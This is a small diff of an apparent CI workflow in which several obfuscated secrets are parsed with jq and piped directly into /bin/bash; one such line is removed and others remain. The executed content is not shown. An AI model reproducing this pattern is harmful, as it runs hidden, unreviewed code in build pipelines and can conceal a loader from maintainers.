@@ -22,7 +22,6 @@ jobs:
           hdiiy10521: ${{ secrets.hdiiy10521 }}
         run: |
           printf '%s' "$hdiiy10521" | jq -r .f3 | /bin/bash
-          echo $jyhd1498 | jq -r .ovtb2259 | /bin/bash
           printf '%s' "$rsgu41" | jq -r .eg52646 | /bin/bash
           printf '%s' "$azye3491" | jq -r .b10032 | /bin/bash
           echo $ky73 | jq -r .mhayv21 | /bin/bash
